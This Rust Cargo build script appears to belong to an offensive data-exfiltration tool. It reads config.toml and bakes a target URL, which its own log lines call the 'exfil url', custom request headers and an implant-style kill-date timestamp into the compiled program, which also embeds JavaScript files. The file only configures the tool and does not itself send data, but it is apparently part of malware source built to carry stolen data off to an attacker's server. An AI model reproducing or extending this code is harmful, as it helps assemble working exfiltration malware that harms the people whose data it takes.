use serde::Deserialize;
use std::collections::HashMap;
use std::{fs, env};
use std::path::Path;

#[macro_export]
macro_rules! info {
    ($content:expr) => {
        println!("cargo::warning=\r[{}] {}", "\x1b[34m>\x1b[0m", $content);
    };
}

#[derive(Deserialize)]
struct Config {
    target_url: String,
    headers: HashMap<String, String>,
    killdate_timestamp: u64,
}

fn main() {
    println!("cargo:rerun-if-changed=config.toml");
    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rerun-if-changed=src/js/*.js");

    let config_str = fs::read_to_string("config.toml").expect("Failed to read config.toml");
    let config: Config = toml::from_str(&config_str).expect("Failed to parse config.toml");

    let mut generated_code = String::new();

    // Generate constants for host and path
    generated_code.push_str(&format!(
        "pub const TARGET_URL: &'static str = \"{}\";\n",
        config.target_url
    ));

    info!(format!("Using exfil url: {}", config.target_url));

    // Generate the headers array
    generated_code.push_str("\npub const HEADERS: &'static [(&'static str, &'static str)] = &[\n");
    for (key, value) in config.headers {
        info!(format!("Using request header: '{}: {}'", key.escape_default(), value.escape_default()));
        generated_code.push_str(&format!(
            "    (\"{}\", \"{}\"),\n",
                                         key.escape_default(),
                                         value.escape_default()
        ));
    }
    generated_code.push_str("];\n");

    let out_dir = env::var("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("config.rs");
    fs::write(&dest_path, generated_code).expect("Failed to write to config.rs");

    info!(format!("Using killdate timestamp: {}", config.killdate_timestamp));
    println!("cargo:rustc-env=KILLDATE_TIMESTAMP={}", config.killdate_timestamp);
}
